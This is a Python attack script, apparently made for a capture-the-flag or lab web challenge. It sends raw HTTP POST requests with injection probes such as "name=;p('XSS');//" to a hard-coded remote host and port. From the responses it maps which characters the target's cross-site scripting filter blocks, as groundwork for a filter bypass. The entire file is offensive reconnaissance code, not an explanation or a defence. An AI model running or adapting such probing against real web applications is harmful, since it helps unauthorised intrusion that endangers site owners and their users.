import socket
import select
import time

print("Testing character filter - optimized for slow responses")
print("=" * 65)

host = "94.237.49.241"
port = 4200

# Letters to test
letters_to_test = ['p', 'q', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

# Results storage
blocked_chars = []
allowed_chars = []
failed_letters = []

# Socket settings
CONNECT_TIMEOUT = 10
RECV_TIMEOUT = 30
MAX_RESPONSE_SIZE = 32768  # 32KB max response

def send_and_receive(letter):
    """Send test payload for a single letter and check response"""
    payload = f"name=;{letter}('XSS');//"
    
    print(f"\nTesting letter: '{letter}'")
    print(f"Payload: {payload}")
    
    try:
        # Create socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(CONNECT_TIMEOUT)
        
        # Connect
        sock.connect((host, port))
        sock.setblocking(1)  # Set to blocking mode
        
        # Build HTTP POST request
        content_length = len(payload)
        http_request = (
            f"POST /page HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"{payload}"
        )
        
        # Send request
        sock.sendall(http_request.encode('utf-8'))
        print(f"  ✓ Sent {len(http_request)} bytes")
        
        # Receive response with timeout handling
        response_data = b""
        sock.settimeout(RECV_TIMEOUT)
        
        # Use select for better timeout handling
        ready = select.select([sock], [], [], RECV_TIMEOUT)
        
        if ready[0]:
            # Socket has data to read
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response_data += chunk
                    
                    # Check if we have the complete response
                    # Look for Content-Length or Connection: close headers
                    if b'\r\n\r\n' in response_data:
                        # Headers received, check if we have body
                        parts = response_data.split(b'\r\n\r\n', 1)
                        if len(parts) == 2:
                            headers, body = parts
                            # Look for Content-Length
                            for line in headers.decode('utf-8', errors='ignore').split('\r\n'):
                                if line.lower().startswith('content-length:'):
                                    try:
                                        expected_length = int(line.split(':')[1].strip())
                                        if len(body) >= expected_length:
                                            print(f"  ✓ Received complete response ({len(response_data)} bytes)")
                                            break
                                    except:
                                        pass
                            
                            # Check Connection: close
                            if b'connection: close' in headers.lower() or b'connection: Close' in headers:
                                if len(response_data) > len(headers) + 4:
                                    break
                    
                    # Safety limit
                    if len(response_data) >= MAX_RESPONSE_SIZE:
                        print(f"  ⚠ Response exceeds max size ({MAX_RESPONSE_SIZE} bytes)")
                        break
                        
                except socket.timeout:
                    if response_data:
                        print(f"  ⚠ Partial response received ({len(response_data)} bytes)")
                    break
                except Exception as e:
                    print(f"  ✗ Receive error: {str(e)}")
                    break
        else:
            print(f"  ✗ No response received within {RECV_TIMEOUT}s")
        
        sock.close()
        
        if response_data:
            # Decode and analyze response
            response_text = response_data.decode('utf-8', errors='ignore')
            
            # Extract status line
            lines = response_text.split('\r\n')
            if lines:
                print(f"  Response: {lines[0]}")
            
            # Check for blocked character message
            blocked_pattern = f"Sorry you can't use: '{letter}'"
            if blocked_pattern in response_text:
                print(f"  🔴 [BLOCKED] Character '{letter}' is blocked!")
                # Show the exact line
                for line in lines:
                    if blocked_pattern in line:
                        print(f"     {line.strip()}")
                        break
                blocked_chars.append(letter)
                return 'blocked'
            elif "Sorry you can't use:" in response_text:
                # Some other character was blocked, but not the one we're testing
                print(f"  ⚠ Other character blocked, not '{letter}'")
                for line in lines:
                    if "Sorry you can't use:" in line:
                        print(f"     {line.strip()}")
                        break
                allowed_chars.append(letter)
                return 'allowed'
            else:
                print(f"  🟢 [ALLOWED] Character '{letter}' is not blocked")
                # Show a brief preview
                if len(response_text) < 300:
                    preview = response_text.replace('\r\n', ' | ').strip()
                    print(f"     Preview: {preview[:200]}")
                allowed_chars.append(letter)
                return 'allowed'
        else:
            print(f"  ⚠ No response data")
            failed_letters.append(letter)
            return 'failed'
            
    except socket.timeout:
        print(f"  ✗ Connection timeout")
        failed_letters.append(letter)
        return 'failed'
    except Exception as e:
        print(f"  ✗ Connection error: {str(e)}")
        failed_letters.append(letter)
        return 'failed'
    finally:
        try:
            sock.close()
        except:
            pass

# Run tests
print("Starting character filter test sequence...")
print(f"Testing {len(letters_to_test)} letters individually")

start_test_time = time.time()

for i, letter in enumerate(letters_to_test):
    print(f"\n[Test {i+1}/{len(letters_to_test)}]", end=" ")
    result = send_and_receive(letter)
    
    # Brief pause between requests
    if i < len(letters_to_test) - 1:
        time.sleep(1)

elapsed_time = time.time() - start_test_time

# Final summary
print("\n" + "=" * 65)
print("CHARACTER FILTER TEST - FINAL RESULTS")
print("=" * 65)
print(f"Total test time: {elapsed_time:.2f} seconds")
print()
print(f"Blocked characters ({len(blocked_chars)}):")
if blocked_chars:
    for char in sorted(blocked_chars):
        print(f"  - '{char}'")
else:
    print("  None found")

print()
print(f"Allowed characters ({len(allowed_chars)}):")
if allowed_chars:
    for char in sorted(allowed_chars):
        print(f"  - '{char}'")
else:
    print("  None found")

print()
print(f"Failed tests ({len(failed_letters)}):")
if failed_letters:
    print(f"  Letters: {failed_letters}")
    print("  These may need retry with adjusted parameters")
else:
    print("  None")

print()
print("=" * 65)
print("Test sequence completed")
